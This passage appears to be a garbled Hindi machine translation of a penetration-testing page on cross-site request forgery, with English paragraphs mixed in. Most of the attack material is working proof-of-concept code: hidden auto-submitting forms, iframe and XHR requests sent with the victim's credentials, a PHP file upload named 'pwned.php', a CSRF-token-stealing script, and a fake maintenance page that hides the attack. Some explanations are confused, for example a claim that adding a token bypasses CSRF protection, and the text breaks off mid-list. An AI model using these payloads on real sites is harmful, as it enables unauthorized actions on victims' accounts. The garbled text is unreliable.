рдпрджрд┐ рдПрдХ **CSRF рдЯреЛрдХрди** рдХрд╛ рдЙрдкрдпреЛрдЧ **рд░рдХреНрд╖рд╛** рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рдПрдХ [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) рджреБрд░реБрдкрдпреЛрдЧ рдпрд╛ рдПрдХ [**рдбреИрдВрдЧрд▓рд┐рдВрдЧ рдорд╛рд░реНрдХрдЕрдк**](dangling-markup-html-scriptless-injection/) рджреБрд░реБрдкрдпреЛрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ **рд╢реЛрд╖рд┐рдд рдХрд░рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### **HTML рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ GET**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
рдЕрдиреНрдп HTML5 рдЯреИрдЧ рдЬреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ GET рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

![](<../.gitbook/assets/image (530).png>)

### рдлреЙрд░реНрдо GET рдЕрдиреБрд░реЛрдз
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### рдлреЙрд░реНрдо рдкреЛрд╕реНрдЯ рдЕрдиреБрд░реЛрдз

A form POST request is a type of HTTP request that is used to submit data to a server. It is commonly used in web applications to send user input or form data to the server for processing. In a form POST request, the data is sent in the body of the request, rather than in the URL.

To make a form POST request, you need to specify the HTTP method as POST in the form's `method` attribute. The form data is then sent to the server when the user submits the form.

Here is an example of a form POST request in HTML:

```html
<form method="POST" action="/submit-form">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Submit</button>
</form>
```

In this example, when the user submits the form, the data entered in the `username` and `password` fields will be sent to the server at the `/submit-form` endpoint using a POST request.

It is important to note that form POST requests can be vulnerable to Cross-Site Request Forgery (CSRF) attacks. CSRF attacks occur when an attacker tricks a user into unknowingly submitting a form on a trusted website, leading to unauthorized actions being performed on their behalf. To protect against CSRF attacks, web applications can implement measures such as using CSRF tokens or checking the `Referer` header in the server-side code.
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### рдЖрдИрдлреНрд░реЗрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлреЙрд░реНрдо рдкреЛрд╕реНрдЯ рдЕрдиреБрд░реЛрдз

рдЖрдИрдлреНрд░реЗрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлреЙрд░реНрдо рдкреЛрд╕реНрдЯ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

1. рдПрдХ рдЖрдИрдлреНрд░реЗрдо рддреИрдпрд╛рд░ рдХрд░реЗрдВ рдФрд░ рдЙрд╕реЗ рд╡реЗрдм рдкреГрд╖реНрда рдореЗрдВ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░реЗрдВред
```html
<iframe name="hiddenFrame" style="display:none;"></iframe>
```

2. рдлреЙрд░реНрдо рдХреЛ рдЖрдИрдлреНрд░реЗрдо рдХреЗ рд╕рд╛рде рд╕рдВрдмрджреНрдз рдХрд░реЗрдВ рдФрд░ рдЕрдиреБрд░реЛрдз рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдИрдлреНрд░реЗрдо рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```html
<form action="https://example.com/post-endpoint" method="POST" target="hiddenFrame">
  <input type="hidden" name="param1" value="value1">
  <input type="hidden" name="param2" value="value2">
  <input type="submit" value="Submit">
</form>
```

рдЗрд╕ рддрд░рд╣, рдЬрдм рдлреЙрд░реНрдо рд╕рдмрдорд┐рдЯ рд╣реЛрддрд╛ рд╣реИ, рдпрд╣ рдЖрдИрдлреНрд░реЗрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреБрд░реЛрдз рдХреЛ рднреЗрдЬрддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЗрд╕рдХрд╛ рдЬреНрдЮрд╛рди рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕ рддрд░реАрдХреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЖрдк рдПрдХ рд╡реЗрдм рдкреГрд╖реНрда рдХреЛ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рджреВрд╕рд░реЗ рд╡реЗрдм рдкреГрд╖реНрда рдХреЗ рдирд╛рдо рдореЗрдВ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ CSRF (рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рдЕрдиреБрд░реЛрдз рдлрд░реНрдЬреА) рд╣рдорд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **рдПрдЬреЗрдХреНрд╕ POST рдЕрдиреБрд░реЛрдз**
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST рдЕрдиреБрд░реЛрдз

рдПрдХ multipart/form-data POST рдЕрдиреБрд░реЛрдз рдПрдХ рд╡реЗрдм рдЕрдиреБрд░реЛрдз рд╣реИ рдЬреЛ рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдбреЗрдЯрд╛ рдХреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рднрд╛рдЧреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рднрд╛рдЧ рдХреЛ рдПрдХ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдмрд╛рдЙрдВрдбрд░реА рдХреЗ рд╕рд╛рде рд╕рдВрдмрджреНрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдЕрдиреБрд░реЛрдз рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИред

рдЬрдм рдПрдХ multipart/form-data POST рдЕрдиреБрд░реЛрдз рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЕрдиреБрд░реЛрдз рдХреЗ рд╣реЗрдбрд░ рдореЗрдВ Content-Type рдореЗрдВ multipart/form-data рдШреЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж, рдЕрдиреБрд░реЛрдз рдмреЙрдбреА рдореЗрдВ рдбреЗрдЯрд╛ рдХреЛ рдмрд╛рдЙрдВрдбрд░реА рдХреЗ рд╕рд╛рде рдПрдиреНрдХреЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдкреНрд░рддреНрдпреЗрдХ рдбреЗрдЯрд╛ рднрд╛рдЧ рдХреЛ рдЙрд╕рдХреЗ рдирд╛рдо, рдЯрд╛рдЗрдк, рдФрд░ рд╡реИрд▓реНрдпреВ рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред

рдПрдХ multipart/form-data POST рдЕрдиреБрд░реЛрдз рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдПрдХ рд╣реИрдХрд░ рдПрдХ рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдореЗрдВ CSRF (Cross-Site Request Forgery) рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред CSRF рд╣рдорд▓рд╛ рдореЗрдВ, рд╣реИрдХрд░ рдПрдХ рд╡рд┐рд╖рдп рдХреЛ рдзреЛрдЦрд╛ рджреЗрдХрд░ рдЙрд╕реЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡реЗрдм рд╕рд╛рдЗрдЯ рдкрд░ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИред рдЬрдм рд╡рд┐рд╖рдп рд╡реЗрдм рд╕рд╛рдЗрдЯ рдкрд░ рд╣реИ, рдЙрд╕рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЙрд╕реЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рдирд╛рдо рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рддрд░рд╣, рд╣реИрдХрд░ рд╡рд┐рд╖рдп рдХреЗ рдирд╛рдо рдореЗрдВ рдЕрдкрд╡рд╛рдж рдбреЗрдЯрд╛ рднреЗрдЬрдХрд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рдзреЛрдЦрд╛ рджреЗ рд╕рдХрддрд╛ рд╣реИред

рдПрдХ CSRF рд╣рдорд▓рд╛ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЛ CSRF рддреЛрдХрдиреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред CSRF рдЯреЛрдХрди рдПрдХ рдпрд╛рддреНрд░реА рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рд╡рд┐рд╖рдп рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╣рд░ рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╡реЗрдм рд╕рд░реНрд╡рд░ рдЕрдиреБрд░реЛрдз рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рдпрд╣ рдпрд╛рддреНрд░реА рдХреЛрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛ рдФрд░ рдпрджрд┐ рдпрд╣ рд╕рд╣реА рд╣реИ, рддреЛ рд╣реА рдЕрдиреБрд░реЛрдз рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдЧрд╛ред рдЗрд╕ рддрд░рд╣, CSRF рд╣рдорд▓рд╛ рдХреЛ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST рдЕрдиреБрд░реЛрдз v2

In this technique, we will explore how to perform a CSRF attack using a multipart/form-data POST request. This technique is effective when the target application uses this type of request to process user-submitted data.

рдЗрд╕ рддрдХрдиреАрдХ рдореЗрдВ, рд╣рдо рдЬрд╛рдВрдЪреЗрдВрдЧреЗ рдХрд┐ рдХреИрд╕реЗ multipart/form-data POST рдЕрдиреБрд░реЛрдз рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ CSRF рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рддрдХрдиреАрдХ рдкреНрд░рднрд╛рд╡реА рд╣реЛрддреА рд╣реИ рдЬрдм рд▓рдХреНрд╖рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╕реНрддреБрдд рдбреЗрдЯрд╛ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

To perform this attack, we need to create a malicious HTML page that includes a form with the necessary fields to submit the request. The form should be configured to target the vulnerable endpoint of the application.

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдПрдХ рджреБрд╖реНрдЯ HTML рдкреЗрдЬ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрдиреБрд░реЛрдз рд╕рдмрдорд┐рдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдлрд╝реАрд▓реНрдбреНрд╕ рдХреЗ рд╕рд╛рде рдПрдХ рдлрд╝реЙрд░реНрдо рд╢рд╛рдорд┐рд▓ рд╣реЛред рдлрд╝реЙрд░реНрдо рдХреЛ рдРрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдпрд╣ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рдВрдХрдЯрдкреВрд░реНрдг рдЕрдВрдд рдмрд┐рдВрджреБ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░реЗред

The fields in the form should match the expected parameters of the vulnerable endpoint. Additionally, we need to include a CSRF token in the form to bypass any CSRF protection mechanisms implemented by the application.

рдлрд╝реЙрд░реНрдо рдореЗрдВ рдлрд╝реАрд▓реНрдбреНрд╕ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдЕрдВрдд рдмрд┐рдВрджреБ рдХреЗ рдЕрдкреЗрдХреНрд╖рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╣рдореЗрдВ рдлрд╝реЙрд░реНрдо рдореЗрдВ рдПрдХ CSRF рдЯреЛрдХрди рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рд▓рд╛рдЧреВ рдХреА рдЧрдИ рдХрд┐рд╕реА рднреА CSRF рд╕реБрд░рдХреНрд╖рд╛ рдпреБрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

Once the victim visits our malicious page, their browser will automatically submit the form, triggering the CSRF attack. The request will be sent to the vulnerable endpoint, and if successful, the attacker can perform actions on behalf of the victim.

рдПрдХ рдмрд╛рд░ рдЬрдм рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ рд╣рдорд╛рд░реЗ рджреБрд╖реНрдЯ рдкреЗрдЬ рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрдирдХрд╛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдлрд╝реЙрд░реНрдо рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░реЗрдЧрд╛, рдЬрд┐рд╕рд╕реЗ CSRF рд╣рдорд▓рд╛ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧрд╛ред рдЕрдиреБрд░реЛрдз рд▓рдХреНрд╖рд┐рдд рдЕрдВрдд рдмрд┐рдВрджреБ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛, рдФрд░ рдпрджрд┐ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ рдХреЗ рдирд╛рдо рдкрд░ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

It is important to note that this technique relies on the victim being authenticated in the target application. Without authentication, the CSRF attack may not be successful.

рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдЗрд╕ рддрдХрдиреАрдХ рдкрд░ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓рдХреНрд╖рд┐рдд рд╡реНрдпрдХреНрддрд┐ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд┐рдирд╛, CSRF рд╣рдорд▓рд╛ рд╕рдлрд▓ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### рдЖрдИрдлреНрд░реЗрдо рдХреЗ рднреАрддрд░ рд╕реЗ рдлреЙрд░реНрдо рдкреЛрд╕реНрдЯ рдЕрдиреБрд░реЛрдз

If you have control over a website and want to perform a Cross-Site Request Forgery (CSRF) attack, you can use an iframe to send a form POST request from within the iframe. This technique allows you to trick the user into unknowingly submitting a form on the target website.

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рд╣реИ рдФрд░ рдЖрдк рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдлрд╝реЙрд░реНрдЬрд╝рд░реА (CSRF) рд╣рдорд▓рд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЖрдИрдлреНрд░реЗрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдИрдлреНрд░реЗрдо рдХреЗ рднреАрддрд░ рд╕реЗ рдПрдХ рдлреЙрд░реНрдо рдкреЛрд╕реНрдЯ рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рддрдХрдиреАрдХ рдЖрдкрдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдХрд░ рд▓рдХреНрд╖рд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдПрдХ рдлреЙрд░реНрдо рд╕рдмрдорд┐рдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рддреА рд╣реИред
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRF рдЯреЛрдХрди рдЪреБрд░рд╛рдПрдВ рдФрд░ рдПрдХ POST рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ**

рдПрдХ CSRF рдЯреЛрдХрди рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЗрд╕рдХреЗ рдмрд╛рдж, рдЖрдкрдХреЛ рд╡реЗрдм рдкреЗрдЬ рдХреЗ HTML рдХреЛ рдЬрд╛рдВрдЪрдирд╛ рд╣реЛрдЧрд╛ рдФрд░ CSRF рдЯреЛрдХрди рдХреЛ рдЦреЛрдЬрдирд╛ рд╣реЛрдЧрд╛ред рдпрд╣ рдЯреЛрдХрди рдЖрдорддреМрд░ рдкрд░ рдПрдХ рдЫрд┐рдкрд╛ рд╣реБрдЖ рдлрд╝реАрд▓реНрдб рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ `<input type="hidden" name="csrf_token" value="рдпрд╣рд╛рдВ рдЖрдкрдХрд╛ рдЯреЛрдХрди рд╣реЛрдЧрд╛">`ред

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рдЯреЛрдХрди рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓реЗрддреЗ рд╣реИрдВ, рдЖрдк рдЗрд╕реЗ рдПрдХ POST рдЕрдиреБрд░реЛрдз рдореЗрдВ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рдПрдХ HTTP POST рдЕрдиреБрд░реЛрдз рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдЗрд╕рдореЗрдВ рдЖрдкрдХреЛ рдЯреЛрдХрди рдХреЛ рд╕рд╣реА рдлрд╝реАрд▓реНрдб рдореЗрдВ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЗрд╕рдХреЗ рдмрд╛рдж, рдЖрдк рдЕрдкрдиреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред рдЬрдм рдпрд╣ рдЕрдиреБрд░реЛрдз рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рд╡рд╣ рд╕рд░реНрд╡рд░ рдЯреЛрдХрди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛ рдФрд░ рдпрджрд┐ рдЯреЛрдХрди рдорд╛рдиреНрдп рд╣реИ, рддреЛ рдЕрдиреБрд░реЛрдз рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдЧрд╛ред рдЗрд╕ рддрд░рд╣, рдЖрдк рдПрдХ CSRF рдЕрдзрд┐рдХрд╛рд░реА рдХреЗ рд░реВрдк рдореЗрдВ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдзреЛрдЦрд╛ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRF рдЯреЛрдХрди рдЪреЛрд░реА рдХрд░реЗрдВ рдФрд░ рдПрдХ рдЖрдИрдлреНрд░реЗрдо, рдПрдХ рдлреЙрд░реНрдо рдФрд░ рдПрдЬреЗрдХреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдкреЛрд╕реНрдЯ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ**

To steal the CSRF token and send a POST request using an iframe, a form, and Ajax, follow these steps:

1. рдПрдХ рдЖрдИрдлреНрд░реЗрдо рдмрдирд╛рдПрдВ рдФрд░ рдЙрд╕реЗ рд╡реЗрдм рдкреЗрдЬ рдореЗрдВ рд╕рдВрдЧрдард┐рдд рдХрд░реЗрдВред
2. рдЖрдИрдлреНрд░реЗрдо рдХреЛ рд▓рдХреНрд╖рд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ CSRF рдЯреЛрдХрди рд╡рд╛рд▓реЗ рдкреЗрдЬ рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред
3. рдПрдХ рдЫрд┐рдкреА рд╣реБрдИ рдлреЙрд░реНрдо рдмрдирд╛рдПрдВ рдФрд░ рдЙрд╕реЗ рдЖрдИрдлреНрд░реЗрдо рдореЗрдВ рджрд░реНрд╢рд╛рдПрдВред
